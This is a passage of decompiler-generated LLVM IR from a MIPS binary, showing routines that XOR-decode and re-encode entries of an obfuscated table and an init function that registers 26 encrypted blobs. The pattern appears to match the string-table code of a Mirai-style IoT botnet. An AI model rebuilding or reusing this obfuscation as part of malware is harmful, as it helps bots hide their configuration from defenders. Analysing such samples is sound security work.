  store i8 %v1_40035c, i8* %v1_400350, align 1
  %v0_400360 = load i32, i32* %a1.global-to-local, align 4
  %v1_400360 = add i32 %v0_400360, 4
  %v2_400360 = inttoptr i32 %v1_400360 to i32*
  %v3_400360 = load i32, i32* %v2_400360, align 4
  %v0_400368 = load i32, i32* %a0.global-to-local, align 4
  %v2_400368 = add i32 %v0_400368, %v3_400360
  %v1_40036c = inttoptr i32 %v2_400368 to i8*
  %v2_40036c = load i8, i8* %v1_40036c, align 1
  %v3_40036c = zext i8 %v2_40036c to i32
  %v1_400374 = load i32, i32* %a2.global-to-local, align 4
  %v2_400374 = xor i32 %v1_400374, %v3_40036c
  store i32 %v2_400374, i32* %v0.global-to-local, align 4
  %v1_400378 = trunc i32 %v2_400374 to i8
  store i8 %v1_400378, i8* %v1_40036c, align 1
  %v0_40037c = load i32, i32* %a1.global-to-local, align 4
  %v1_40037c = add i32 %v0_40037c, 4
  %v2_40037c = inttoptr i32 %v1_40037c to i32*
  %v3_40037c = load i32, i32* %v2_40037c, align 4
  %v0_400384 = load i32, i32* %a0.global-to-local, align 4
  %v2_400384 = add i32 %v0_400384, %v3_40037c
  %v1_400388 = inttoptr i32 %v2_400384 to i8*
  %v2_400388 = load i8, i8* %v1_400388, align 1
  %v3_400388 = zext i8 %v2_400388 to i32
  %v1_40038c = add i32 %v0_400384, 1
  store i32 %v1_40038c, i32* %a0.global-to-local, align 4
  %v1_400390 = load i32, i32* %a2.global-to-local, align 4
  %v2_400390 = xor i32 %v1_400390, %v3_400388
  store i32 %v2_400390, i32* %v0.global-to-local, align 4
  %v1_400394 = trunc i32 %v2_400390 to i8
  store i8 %v1_400394, i8* %v1_400388, align 1
  %v0_400398 = load i32, i32* %a1.global-to-local, align 4
  %v1_400398 = add i32 %v0_400398, 8
  %v2_400398 = inttoptr i32 %v1_400398 to i16*
  %v3_400398 = load i16, i16* %v2_400398, align 2
  %v4_400398 = zext i16 %v3_400398 to i32
  %v0_4003a0 = load i32, i32* %a0.global-to-local, align 4
  %v2_4003a0 = icmp slt i32 %v0_4003a0, %v4_400398
  %v3_4003a0 = zext i1 %v2_4003a0 to i32
  store i32 %v3_4003a0, i32* %v0.global-to-local, align 4
  br i1 %v2_4003a0, label %dec_label_pc_400328.dec_label_pc_400328_crit_edge, label %dec_label_pc_4003a8

dec_label_pc_400328.dec_label_pc_400328_crit_edge: ; preds = %dec_label_pc_400328
  %v1_40033c.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400328

dec_label_pc_4003a8:                              ; preds = %dec_label_pc_400328
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4003b4

dec_label_pc_4003b4:                              ; preds = %dec_label_pc_4003b4, %dec_label_pc_4003a8
  %v0_4003bc = phi i32 [ %v1_4003dc, %dec_label_pc_4003b4 ], [ 0, %dec_label_pc_4003a8 ]
  %v0_4003b4 = phi i32 [ %v0_4003e0, %dec_label_pc_4003b4 ], [ %v0_400398, %dec_label_pc_4003a8 ]
  %v1_4003b4 = add i32 %v0_4003b4, 4
  %v2_4003b4 = inttoptr i32 %v1_4003b4 to i32*
  %v3_4003b4 = load i32, i32* %v2_4003b4, align 4
  %v2_4003bc = add i32 %v3_4003b4, %v0_4003bc
  store i32 %v2_4003bc, i32* %v0.global-to-local, align 4
  %v1_4003c0 = add i32 %v2_4003bc, 1
  %v2_4003c0 = inttoptr i32 %v1_4003c0 to i8*
  %v3_4003c0 = load i8, i8* %v2_4003c0, align 1
  %v1_4003c4 = inttoptr i32 %v2_4003bc to i8*
  %v2_4003c4 = load i8, i8* %v1_4003c4, align 1
  %v3_4003c4 = sext i8 %v2_4003c4 to i32
  store i32 %v3_4003c4, i32* %a0.global-to-local, align 4
  store i8 %v3_4003c0, i8* %v1_4003c4, align 1
  %v0_4003cc = load i32, i32* %a1.global-to-local, align 4
  %v1_4003cc = add i32 %v0_4003cc, 4
  %v2_4003cc = inttoptr i32 %v1_4003cc to i32*
  %v3_4003cc = load i32, i32* %v2_4003cc, align 4
  %v1_4003d4 = load i32, i32* %a2.global-to-local, align 4
  %v2_4003d4 = add i32 %v1_4003d4, %v3_4003cc
  store i32 %v2_4003d4, i32* %v0.global-to-local, align 4
  %v0_4003d8 = load i32, i32* %a0.global-to-local, align 4
  %v1_4003d8 = trunc i32 %v0_4003d8 to i8
  %v3_4003d8 = add i32 %v2_4003d4, 1
  %v4_4003d8 = inttoptr i32 %v3_4003d8 to i8*
  store i8 %v1_4003d8, i8* %v4_4003d8, align 1
  %v0_4003dc = load i32, i32* %a2.global-to-local, align 4
  %v1_4003dc = add i32 %v0_4003dc, 2
  store i32 %v1_4003dc, i32* %a2.global-to-local, align 4
  %v0_4003e0 = load i32, i32* %a1.global-to-local, align 4
  %v1_4003e0 = add i32 %v0_4003e0, 8
  %v2_4003e0 = inttoptr i32 %v1_4003e0 to i16*
  %v3_4003e0 = load i16, i16* %v2_4003e0, align 2
  %v4_4003e0 = zext i16 %v3_4003e0 to i32
  %v2_4003e8 = icmp slt i32 %v1_4003dc, %v4_4003e0
  %v3_4003e8 = zext i1 %v2_4003e8 to i32
  store i32 %v3_4003e8, i32* %v0.global-to-local, align 4
  br i1 %v2_4003e8, label %dec_label_pc_4003b4, label %dec_label_pc_4003f0

dec_label_pc_4003f0:                              ; preds = %dec_label_pc_4003b4
  %v2_4003f4 = add i32 %v0_4003e0, 10
  %v3_4003f4 = inttoptr i32 %v2_4003f4 to i8*
  store i8 0, i8* %v3_4003f4, align 1
  ret i32 %v3_4003e8

dec_label_pc_4003fc:                              ; preds = %dec_label_pc_4002f0
  %v1_4003fc = add i32 %v0_400308, 12
  %v2_4003fc = inttoptr i32 %v1_4003fc to i32*
  %v3_4003fc = load i32, i32* %v2_4003fc, align 4
  store i32 %v3_4003fc, i32* %a1.global-to-local, align 4
  %v1_400404 = icmp eq i32 %v3_4003fc, 0
  br i1 %v1_400404, label %dec_label_pc_400408, label %dec_label_pc_4002f0

dec_label_pc_400408:                              ; preds = %dec_label_pc_4003fc
  store i8 0, i8* inttoptr (i32 10 to i8*), align 2
  %v1_400410.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400410

dec_label_pc_400410:                              ; preds = %dec_label_pc_400304, %dec_label_pc_400408
  %v1_400410 = phi i32 [ %v4_400308, %dec_label_pc_400304 ], [ %v1_400410.pre, %dec_label_pc_400408 ]
  ret i32 %v1_400410

; uselistorder directives
  uselistorder i32 %v3_4003fc, { 1, 2, 0 }
  uselistorder i32 %v0_4003e0, { 0, 2, 1 }
  uselistorder i32 %v1_4003dc, { 0, 2, 1 }
  uselistorder i32 %v0_4003a0, { 1, 0 }
  uselistorder i32 %v0_400398, { 0, 2, 1 }
  uselistorder i32 %v0_400384, { 1, 0 }
  uselistorder i32 %v2_4002f0, { 1, 0, 2 }
  uselistorder i32 %v0_400308, { 2, 0, 1, 3 }
  uselistorder i32 %v1_4002ec, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 9, 7, 0, 1, 2, 3, 4, 5, 6, 8, 10, 11 }
  uselistorder i32* %a2.global-to-local, { 6, 5, 4, 0, 1, 2, 3 }
  uselistorder i32* %a1.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder label %dec_label_pc_400410, { 1, 0 }
}

define i32 @function_400418(i32 %arg1) local_unnamed_addr {
dec_label_pc_400418:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_400424 = load i32, i32* bitcast (i32** @global_var_449aa8.13 to i32*), align 4
  store i32 %v3_400424, i32* %v0.global-to-local, align 4
  store i32 %v3_400424, i32* %a1.global-to-local, align 4
  %v1_400434 = urem i32 %arg1, 256
  store i32 %v1_400434, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_400438

dec_label_pc_400438:                              ; preds = %dec_label_pc_400548, %dec_label_pc_400418
  %v0_400450 = phi i32 [ %v3_400548, %dec_label_pc_400548 ], [ %v3_400424, %dec_label_pc_400418 ]
  %v1_400438 = inttoptr i32 %v0_400450 to i32*
  %v2_400438 = load i32, i32* %v1_400438, align 4
  store i32 %v2_400438, i32* %v0.global-to-local, align 4
  %v1_400440 = icmp sgt i32 %v2_400438, 0
  %v2_400448 = icmp eq i32 %v1_400434, %v2_400438
  %or.cond = and i1 %v1_400440, %v2_400448
  br i1 %or.cond, label %dec_label_pc_40044c, label %dec_label_pc_400548

dec_label_pc_40044c:                              ; preds = %dec_label_pc_400438
  %v1_400450 = add i32 %v0_400450, 10
  %v2_400450 = inttoptr i32 %v1_400450 to i8*
  %v3_400450 = load i8, i8* %v2_400450, align 1
  %v4_400450 = sext i8 %v3_400450 to i32
  store i32 %v4_400450, i32* %v0.global-to-local, align 4
  %v1_400458 = icmp eq i8 %v3_400450, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400458, label %dec_label_pc_40045c, label %dec_label_pc_40055c

dec_label_pc_40045c:                              ; preds = %dec_label_pc_40044c
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400470

dec_label_pc_400470:                              ; preds = %dec_label_pc_400470.dec_label_pc_400470_crit_edge, %dec_label_pc_40045c
  %v1_400484 = phi i32 [ %v1_400484.pre, %dec_label_pc_400470.dec_label_pc_400470_crit_edge ], [ -19, %dec_label_pc_40045c ]
  %v0_400478 = phi i32 [ %v0_4004e8, %dec_label_pc_400470.dec_label_pc_400470_crit_edge ], [ 0, %dec_label_pc_40045c ]
  %v0_400470 = phi i32 [ %v0_4004e0, %dec_label_pc_400470.dec_label_pc_400470_crit_edge ], [ %v0_400450, %dec_label_pc_40045c ]
  %v1_400470 = add i32 %v0_400470, 4
  %v2_400470 = inttoptr i32 %v1_400470 to i32*
  %v3_400470 = load i32, i32* %v2_400470, align 4
  %v2_400478 = add i32 %v3_400470, %v0_400478
  %v1_40047c = inttoptr i32 %v2_400478 to i8*
  %v2_40047c = load i8, i8* %v1_40047c, align 1
  %v3_40047c = zext i8 %v2_40047c to i32
  %v2_400484 = xor i32 %v3_40047c, %v1_400484
  store i32 %v2_400484, i32* %v0.global-to-local, align 4
  %v1_400488 = trunc i32 %v2_400484 to i8
  store i8 %v1_400488, i8* %v1_40047c, align 1
  %v0_40048c = load i32, i32* %a1.global-to-local, align 4
  %v1_40048c = add i32 %v0_40048c, 4
  %v2_40048c = inttoptr i32 %v1_40048c to i32*
  %v3_40048c = load i32, i32* %v2_40048c, align 4
  %v0_400494 = load i32, i32* %a0.global-to-local, align 4
  %v2_400494 = add i32 %v0_400494, %v3_40048c
  %v1_400498 = inttoptr i32 %v2_400494 to i8*
  %v2_400498 = load i8, i8* %v1_400498, align 1
  %v3_400498 = zext i8 %v2_400498 to i32
  %v1_4004a0 = load i32, i32* @a3, align 4
  %v2_4004a0 = xor i32 %v1_4004a0, %v3_400498
  store i32 %v2_4004a0, i32* %v0.global-to-local, align 4
  %v1_4004a4 = trunc i32 %v2_4004a0 to i8
  store i8 %v1_4004a4, i8* %v1_400498, align 1
  %v0_4004a8 = load i32, i32* %a1.global-to-local, align 4
  %v1_4004a8 = add i32 %v0_4004a8, 4
  %v2_4004a8 = inttoptr i32 %v1_4004a8 to i32*
  %v3_4004a8 = load i32, i32* %v2_4004a8, align 4
  %v0_4004b0 = load i32, i32* %a0.global-to-local, align 4
  %v2_4004b0 = add i32 %v0_4004b0, %v3_4004a8
  %v1_4004b4 = inttoptr i32 %v2_4004b0 to i8*
  %v2_4004b4 = load i8, i8* %v1_4004b4, align 1
  %v3_4004b4 = zext i8 %v2_4004b4 to i32
  %v1_4004bc = load i32, i32* %a2.global-to-local, align 4
  %v2_4004bc = xor i32 %v1_4004bc, %v3_4004b4
  store i32 %v2_4004bc, i32* %v0.global-to-local, align 4
  %v1_4004c0 = trunc i32 %v2_4004bc to i8
  store i8 %v1_4004c0, i8* %v1_4004b4, align 1
  %v0_4004c4 = load i32, i32* %a1.global-to-local, align 4
  %v1_4004c4 = add i32 %v0_4004c4, 4
  %v2_4004c4 = inttoptr i32 %v1_4004c4 to i32*
  %v3_4004c4 = load i32, i32* %v2_4004c4, align 4
  %v0_4004cc = load i32, i32* %a0.global-to-local, align 4
  %v2_4004cc = add i32 %v0_4004cc, %v3_4004c4
  %v1_4004d0 = inttoptr i32 %v2_4004cc to i8*
  %v2_4004d0 = load i8, i8* %v1_4004d0, align 1
  %v3_4004d0 = zext i8 %v2_4004d0 to i32
  %v1_4004d4 = add i32 %v0_4004cc, 1
  store i32 %v1_4004d4, i32* %a0.global-to-local, align 4
  %v1_4004d8 = load i32, i32* %a2.global-to-local, align 4
  %v2_4004d8 = xor i32 %v1_4004d8, %v3_4004d0
  store i32 %v2_4004d8, i32* %v0.global-to-local, align 4
  %v1_4004dc = trunc i32 %v2_4004d8 to i8
  store i8 %v1_4004dc, i8* %v1_4004d0, align 1
  %v0_4004e0 = load i32, i32* %a1.global-to-local, align 4
  %v1_4004e0 = add i32 %v0_4004e0, 8
  %v2_4004e0 = inttoptr i32 %v1_4004e0 to i16*
  %v3_4004e0 = load i16, i16* %v2_4004e0, align 2
  %v4_4004e0 = zext i16 %v3_4004e0 to i32
  %v0_4004e8 = load i32, i32* %a0.global-to-local, align 4
  %v2_4004e8 = icmp slt i32 %v0_4004e8, %v4_4004e0
  %v3_4004e8 = zext i1 %v2_4004e8 to i32
  store i32 %v3_4004e8, i32* %v0.global-to-local, align 4
  br i1 %v2_4004e8, label %dec_label_pc_400470.dec_label_pc_400470_crit_edge, label %dec_label_pc_4004f0

dec_label_pc_400470.dec_label_pc_400470_crit_edge: ; preds = %dec_label_pc_400470
  %v1_400484.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400470

dec_label_pc_4004f0:                              ; preds = %dec_label_pc_400470
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4004fc

dec_label_pc_4004fc:                              ; preds = %dec_label_pc_4004fc, %dec_label_pc_4004f0
  %v0_400504 = phi i32 [ %v1_400524, %dec_label_pc_4004fc ], [ 0, %dec_label_pc_4004f0 ]
  %v0_4004fc = phi i32 [ %v0_400528, %dec_label_pc_4004fc ], [ %v0_4004e0, %dec_label_pc_4004f0 ]
  %v1_4004fc = add i32 %v0_4004fc, 4
  %v2_4004fc = inttoptr i32 %v1_4004fc to i32*
  %v3_4004fc = load i32, i32* %v2_4004fc, align 4
  %v2_400504 = add i32 %v3_4004fc, %v0_400504
  store i32 %v2_400504, i32* %v0.global-to-local, align 4
  %v1_400508 = add i32 %v2_400504, 1
  %v2_400508 = inttoptr i32 %v1_400508 to i8*
  %v3_400508 = load i8, i8* %v2_400508, align 1
  %v1_40050c = inttoptr i32 %v2_400504 to i8*
  %v2_40050c = load i8, i8* %v1_40050c, align 1
  %v3_40050c = sext i8 %v2_40050c to i32
  store i32 %v3_40050c, i32* %a0.global-to-local, align 4
  store i8 %v3_400508, i8* %v1_40050c, align 1
  %v0_400514 = load i32, i32* %a1.global-to-local, align 4
  %v1_400514 = add i32 %v0_400514, 4
  %v2_400514 = inttoptr i32 %v1_400514 to i32*
  %v3_400514 = load i32, i32* %v2_400514, align 4
  %v1_40051c = load i32, i32* %a2.global-to-local, align 4
  %v2_40051c = add i32 %v1_40051c, %v3_400514
  store i32 %v2_40051c, i32* %v0.global-to-local, align 4
  %v0_400520 = load i32, i32* %a0.global-to-local, align 4
  %v1_400520 = trunc i32 %v0_400520 to i8
  %v3_400520 = add i32 %v2_40051c, 1
  %v4_400520 = inttoptr i32 %v3_400520 to i8*
  store i8 %v1_400520, i8* %v4_400520, align 1
  %v0_400524 = load i32, i32* %a2.global-to-local, align 4
  %v1_400524 = add i32 %v0_400524, 2
  store i32 %v1_400524, i32* %a2.global-to-local, align 4
  %v0_400528 = load i32, i32* %a1.global-to-local, align 4
  %v1_400528 = add i32 %v0_400528, 8
  %v2_400528 = inttoptr i32 %v1_400528 to i16*
  %v3_400528 = load i16, i16* %v2_400528, align 2
  %v4_400528 = zext i16 %v3_400528 to i32
  %v1_400530 = add nsw i32 %v4_400528, -1
  %v2_400534 = icmp slt i32 %v1_400524, %v1_400530
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_400534, label %dec_label_pc_4004fc, label %dec_label_pc_40053c

dec_label_pc_40053c:                              ; preds = %dec_label_pc_4004fc
  %v5_400540 = add i32 %v0_400528, 10
  %v6_400540 = inttoptr i32 %v5_400540 to i8*
  store i8 1, i8* %v6_400540, align 1
  ret i32 1

dec_label_pc_400548:                              ; preds = %dec_label_pc_400438
  %v1_400548 = add i32 %v0_400450, 12
  %v2_400548 = inttoptr i32 %v1_400548 to i32*
  %v3_400548 = load i32, i32* %v2_400548, align 4
  store i32 %v3_400548, i32* %a1.global-to-local, align 4
  %v1_400550 = icmp eq i32 %v3_400548, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_400550, label %dec_label_pc_400554, label %dec_label_pc_400438

dec_label_pc_400554:                              ; preds = %dec_label_pc_400548
  store i8 1, i8* inttoptr (i32 10 to i8*), align 2
  %v1_40055c.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40055c

dec_label_pc_40055c:                              ; preds = %dec_label_pc_40044c, %dec_label_pc_400554
  %v1_40055c = phi i32 [ %v4_400450, %dec_label_pc_40044c ], [ %v1_40055c.pre, %dec_label_pc_400554 ]
  ret i32 %v1_40055c

; uselistorder directives
  uselistorder i32 %v3_400548, { 1, 2, 0 }
  uselistorder i32 %v0_400528, { 0, 2, 1 }
  uselistorder i32 %v1_400524, { 0, 2, 1 }
  uselistorder i32 %v0_4004e8, { 1, 0 }
  uselistorder i32 %v0_4004e0, { 0, 2, 1 }
  uselistorder i32 %v0_4004cc, { 1, 0 }
  uselistorder i32 %v2_400438, { 1, 0, 2 }
  uselistorder i32 %v0_400450, { 2, 0, 1, 3 }
  uselistorder i32 %v1_400434, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_40055c, { 1, 0 }
}

define i32 @function_400564(i32 %arg1) local_unnamed_addr {
dec_label_pc_400564:
  %v3_400570 = load i32, i32* bitcast (i32** @global_var_449aa8.13 to i32*), align 4
  %v1_400580 = urem i32 %arg1, 256
  br label %dec_label_pc_400584

dec_label_pc_400584:                              ; preds = %dec_label_pc_40059c, %dec_label_pc_400564
  %v0_4005b4 = phi i32 [ %v3_40059c, %dec_label_pc_40059c ], [ %v3_400570, %dec_label_pc_400564 ]
  %v1_400584 = inttoptr i32 %v0_4005b4 to i32*
  %v2_400584 = load i32, i32* %v1_400584, align 4
  %v1_40058c = icmp sgt i32 %v2_400584, 0
  %v2_400594 = icmp eq i32 %v1_400580, %v2_400584
  %or.cond = and i1 %v1_40058c, %v2_400594
  br i1 %or.cond, label %dec_label_pc_4005b4, label %dec_label_pc_40059c

dec_label_pc_40059c:                              ; preds = %dec_label_pc_400584
  %v1_40059c = add i32 %v0_4005b4, 12
  %v2_40059c = inttoptr i32 %v1_40059c to i32*
  %v3_40059c = load i32, i32* %v2_40059c, align 4
  %v1_4005a4 = icmp eq i32 %v3_40059c, 0
  br i1 %v1_4005a4, label %dec_label_pc_4005a8, label %dec_label_pc_400584

dec_label_pc_4005a8:                              ; preds = %dec_label_pc_40059c
  ret i32 0

dec_label_pc_4005b4:                              ; preds = %dec_label_pc_400584
  %v1_4005b4 = add i32 %v0_4005b4, 4
  %v2_4005b4 = inttoptr i32 %v1_4005b4 to i32*
  %v3_4005b4 = load i32, i32* %v2_4005b4, align 4
  ret i32 %v3_4005b4

; uselistorder directives
  uselistorder i32 %v3_40059c, { 1, 0 }
  uselistorder i32 %v2_400584, { 1, 0 }
}

define i32 @function_4005c0() local_unnamed_addr {
dec_label_pc_4005c0:
  %v1_4005e0 = call i32 @unknown_0()
  %v1_4005ec = inttoptr i32 %v1_4005e0 to i32*
  store i32 0, i32* %v1_4005ec, align 4
  %v3_4005f0 = load i32, i32* bitcast (i32** @global_var_449b64.16 to i32*), align 4
  %v2_4005f8 = inttoptr i32 %v3_4005f0 to i32*
  store i32 %v1_4005e0, i32* %v2_4005f8, align 4
  %v3_4005fc = load i32, i32* bitcast (i32** @global_var_449aa8.13 to i32*), align 4
  %v2_400604 = inttoptr i32 %v3_4005fc to i32*
  store i32 %v1_4005e0, i32* %v2_400604, align 4
  %v1_400608 = add i32 %v1_4005e0, 12
  %v2_400608 = inttoptr i32 %v1_400608 to i32*
  store i32 0, i32* %v2_400608, align 4
  ret i32 %v1_4005e0

; uselistorder directives
  uselistorder i32 %v1_4005e0, { 0, 2, 1, 3, 4 }
}

define i32 @function_40061c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40061c:
  %s3.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v0_400634 = load i32, i32* @s2, align 4
  %v0_400638 = load i32, i32* @s1, align 4
  %v0_40063c = load i32, i32* @s0, align 4
  store i32 %arg1, i32* @s2, align 4
  %v1_400650 = urem i32 %arg2, 65536
  store i32 %v1_400650, i32* @s1, align 4
  store i32 %arg3, i32* %s3.global-to-local, align 4
  %v2_400654 = call i32 @unknown_0()
  %v0_400660 = load i32, i32* @s1, align 4
  %v3_400664 = load i32, i32* @global_var_449c08.14, align 4
  store i32 %v3_400664, i32* @t9, align 4
  %v0_400668 = load i32, i32* @s2, align 4
  %v2_400668 = inttoptr i32 %v2_400654 to i32*
  store i32 %v0_400668, i32* %v2_400668, align 4
  store i32 %v2_400654, i32* @s0, align 4
  %v3_40066c = call i32 @function_406140(i32 %v0_400660)
  store i32 %v3_40066c, i32* @v0, align 4
  %v1_400678 = load i32, i32* @s0, align 4
  %v2_400678 = add i32 %v1_400678, 4
  %v3_400678 = inttoptr i32 %v2_400678 to i32*
  store i32 %v3_40066c, i32* %v3_400678, align 4
  %v3_40067c = load i32, i32* @global_var_449b3c.17, align 4
  store i32 %v3_40067c, i32* @t9, align 4
  %v0_400684 = load i32, i32* %s3.global-to-local, align 4
  %v1_400688 = load i32, i32* @s1, align 4
  %v5_400688 = call i32 @function_403edc(i32 %v3_40066c, i32 %v0_400684, i32 %v1_400688)
  %v3_400698 = load i32, i32* bitcast (i32** @global_var_449b64.16 to i32*), align 4
  store i32 %v3_400698, i32* %v1.global-to-local, align 4
  %v0_40069c = load i32, i32* @s1, align 4
  %v1_40069c = trunc i32 %v0_40069c to i16
  %v2_40069c = load i32, i32* @s0, align 4
  %v3_40069c = add i32 %v2_40069c, 8
  %v4_40069c = inttoptr i32 %v3_40069c to i16*
  store i16 %v1_40069c, i16* %v4_40069c, align 2
  %v3_4006a4 = load i32, i32* @s0, align 4
  %v4_4006a4 = add i32 %v3_4006a4, 10
  %v5_4006a4 = inttoptr i32 %v4_4006a4 to i8*
  store i8 -1, i8* %v5_4006a4, align 1
  %v0_4006a8 = load i32, i32* @s0, align 4
  %v1_4006a8 = add i32 %v0_4006a8, 12
  %v2_4006a8 = inttoptr i32 %v1_4006a8 to i32*
  store i32 0, i32* %v2_4006a8, align 4
  %v0_4006ac = load i32, i32* @s0, align 4
  store i32 %v0_4006ac, i32* @global_var_449b70.18, align 4
  %v1_4006b0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4006b0 = inttoptr i32 %v1_4006b0 to i32*
  store i32 %v0_4006ac, i32* %v2_4006b0, align 4
  store i32 %v0_400634, i32* @s2, align 4
  store i32 %v0_400638, i32* @s1, align 4
  store i32 %v0_40063c, i32* @s0, align 4
  ret i32 -1
}

define i32 @function_4006d0() local_unnamed_addr {
dec_label_pc_4006d0:
  %v3_4006e8 = load i32, i32* @global_var_449b74.19, align 4
  store i32 %v3_4006e8, i32* @t9, align 4
  %v1_4006f0 = call i32 @function_4005c0()
  %v3_400704 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400704, i32* @t9, align 4
  %v4_40070c = call i32 @function_40061c(i32 1, i32 21, i32 ptrtoint (i32* @global_var_4082a0.21 to i32))
  %v3_400720 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400720, i32* @t9, align 4
  %v4_400728 = call i32 @function_40061c(i32 2, i32 21, i32 ptrtoint (i32* @global_var_4082b8.22 to i32))
  %v3_40073c = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_40073c, i32* @t9, align 4
  %v4_400744 = call i32 @function_40061c(i32 3, i32 7, i32 ptrtoint (i32* @global_var_4082d0.23 to i32))
  %v3_400758 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400758, i32* @t9, align 4
  %v4_400760 = call i32 @function_40061c(i32 4, i32 6, i32 ptrtoint (i32* @global_var_4082d8.24 to i32))
  %v3_400774 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400774, i32* @t9, align 4
  %v4_40077c = call i32 @function_40061c(i32 5, i32 5, i32 ptrtoint (i32* @global_var_4082e0.25 to i32))
  %v3_400790 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400790, i32* @t9, align 4
  %v4_400798 = call i32 @function_40061c(i32 6, i32 14, i32 ptrtoint (i32* @global_var_4082e8.26 to i32))
  %v3_4007ac = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4007ac, i32* @t9, align 4
  %v4_4007b4 = call i32 @function_40061c(i32 7, i32 4, i32 ptrtoint (i32* @global_var_4082f8.27 to i32))
  %v3_4007c8 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4007c8, i32* @t9, align 4
  %v4_4007d0 = call i32 @function_40061c(i32 8, i32 17, i32 ptrtoint (i32* @global_var_408300.28 to i32))
  %v3_4007e4 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4007e4, i32* @t9, align 4
  %v4_4007ec = call i32 @function_40061c(i32 9, i32 10, i32 ptrtoint (i32* @global_var_408314.29 to i32))
  %v3_400800 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400800, i32* @t9, align 4
  %v4_400808 = call i32 @function_40061c(i32 10, i32 8, i32 ptrtoint (i32* @global_var_408320.30 to i32))
  %v3_40081c = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_40081c, i32* @t9, align 4
  %v4_400824 = call i32 @function_40061c(i32 11, i32 13, i32 ptrtoint (i32* @global_var_40832c.31 to i32))
  %v3_400838 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400838, i32* @t9, align 4
  %v4_400840 = call i32 @function_40061c(i32 12, i32 11, i32 ptrtoint (i32* @global_var_40833c.32 to i32))
  %v3_400854 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400854, i32* @t9, align 4
  %v4_40085c = call i32 @function_40061c(i32 13, i32 15, i32 ptrtoint (i32* @global_var_408348.33 to i32))
  %v3_400870 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400870, i32* @t9, align 4
  %v4_400878 = call i32 @function_40061c(i32 14, i32 10, i32 ptrtoint (i32* @global_var_408358.34 to i32))
  %v3_40088c = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_40088c, i32* @t9, align 4
  %v4_400894 = call i32 @function_40061c(i32 15, i32 10, i32 ptrtoint (i32* @global_var_408364.35 to i32))
  %v3_4008a8 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4008a8, i32* @t9, align 4
  %v4_4008b0 = call i32 @function_40061c(i32 16, i32 23, i32 ptrtoint (i32* @global_var_408370.36 to i32))
  %v3_4008c4 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4008c4, i32* @t9, align 4
  %v4_4008cc = call i32 @function_40061c(i32 17, i32 33, i32 ptrtoint (i32* @global_var_408388.37 to i32))
  %v3_4008e0 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4008e0, i32* @t9, align 4
  %v4_4008e8 = call i32 @function_40061c(i32 18, i32 23, i32 ptrtoint (i32* @global_var_4083ac.38 to i32))
  %v3_4008fc = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4008fc, i32* @t9, align 4
  %v4_400904 = call i32 @function_40061c(i32 19, i32 8, i32 ptrtoint (i32* @global_var_4083c4.39 to i32))
  %v3_400918 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400918, i32* @t9, align 4
  %v4_400920 = call i32 @function_40061c(i32 20, i32 8, i32 ptrtoint (i32* @global_var_4083d0.40 to i32))
  %v3_400934 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400934, i32* @t9, align 4
  %v4_40093c = call i32 @function_40061c(i32 21, i32 23, i32 ptrtoint (i32* @global_var_4083dc.41 to i32))
  %v3_400950 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400950, i32* @t9, align 4
  %v4_400958 = call i32 @function_40061c(i32 22, i32 10, i32 ptrtoint (i32* @global_var_4083f4.42 to i32))
  %v3_40096c = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_40096c, i32* @t9, align 4
  %v4_400974 = call i32 @function_40061c(i32 25, i32 16, i32 ptrtoint (i32* @global_var_408400.43 to i32))
  %v3_400988 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_400988, i32* @t9, align 4
  %v4_400990 = call i32 @function_40061c(i32 26, i32 15, i32 ptrtoint (i32* @global_var_408414.44 to i32))
  %v3_4009a4 = load i32, i32* @global_var_449b5c.20, align 4
  store i32 %v3_4009a4, i32* @t9, align 4
